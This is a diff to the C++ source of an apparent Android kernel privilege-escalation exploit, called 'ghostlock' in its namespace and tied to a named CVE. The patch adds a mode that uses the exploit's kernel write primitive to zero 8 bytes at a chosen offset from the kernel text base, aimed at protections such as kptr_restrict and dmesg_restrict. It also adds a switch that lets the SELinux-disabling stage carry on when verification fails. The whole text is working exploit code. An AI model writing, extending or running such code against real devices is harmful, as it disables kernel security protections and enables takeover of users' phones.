@@ -433,8 +433,51 @@ namespace ghostlock::session::backend {
         /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
         template <class M>
         StageResult w1(ExploitSession &session) {
+            /* Static-zero probe: write 8 zero bytes to <text base runtime> + offset and
+             * stop. Used to reach symbol data that is independent of any task pointer
+             * (e.g. dmesg_restrict / kptr_restrict) on kernels where the victim task
+             * address cannot be recovered. */
+            if (const char *zs = std::getenv("GHOSTLOCK_ZERO_OFF"); zs && zs[0]) {
+                const std::uintptr_t off =
+                        static_cast<std::uintptr_t>(std::strtoull(zs, nullptr, 0));
+                const std::uintptr_t target =
+                        ghostlock::target::address::kImageTextBaseRuntime + off;
+                if (const char *dry = std::getenv("GHOSTLOCK_ZERO_DRY"); dry && dry[0] == '1') {
+                    pr_info("zero dry run: text=0x%zx off=0x%zx target=0x%zx\n",
+                            static_cast<std::size_t>(
+                                    ghostlock::target::address::kImageTextBaseRuntime),
+                            static_cast<std::size_t>(off),
+                            static_cast<std::size_t>(target));
+                    std::fflush(stdout);
+                    ::_exit(0);
+                }
+                const bool leaf =
+                        std::getenv("GHOSTLOCK_ZERO_LEAF") != nullptr;
+                const memory::WriteRequest request = memory::WriteRequest::make(
+                        target, memory::WriteMode::Zero, leaf ? 0 : 1);
+                pr_info("zero mode: %s\n", leaf ? "leaf" : "preserve");
+                const Status st = Cve2026_43499Policy::template attack_write<M>(
+                        session, request, "ZERO");
+                pr_info("zero write %s at 0x%zx (text 0x%zx + off 0x%zx)\n",
+                        st ? "ok" : "failed",
+                        static_cast<std::size_t>(target),
+                        static_cast<std::size_t>(
+                                ghostlock::target::address::kImageTextBaseRuntime),
+                        static_cast<std::size_t>(off));
+                std::fflush(stdout);
+                ::_exit(st ? 0 : 3);
+            }
             /* W1: disable SELinux before task discovery. untrusted_app may not be able
          * to read enforce while it is still enforcing, so attempt W1 regardless. */
+            /* Some vendor kernels glue /sys/fs/selinux/enforce to a constant
+         * (Honor 4.14.186+ prints "1" unconditionally), so the stage can never
+         * verify. GHOSTLOCK_SKIP_W1 keeps the run going for those kernels. */
+            if (const char *skip = getenv("GHOSTLOCK_SKIP_W1"); skip && skip[0] == '1') {
+                pr_warning("W1 skipped (GHOSTLOCK_SKIP_W1=1)\n");
+                support::run_state::complete("w1a");
+                support::run_state::complete("w1b");
+                return StageResult::Continue;
+            }
             Status selinux_ok = attack::check_selinux_off();
             if (!selinux_ok) {
                 if (!attack::enforce_readable()) {
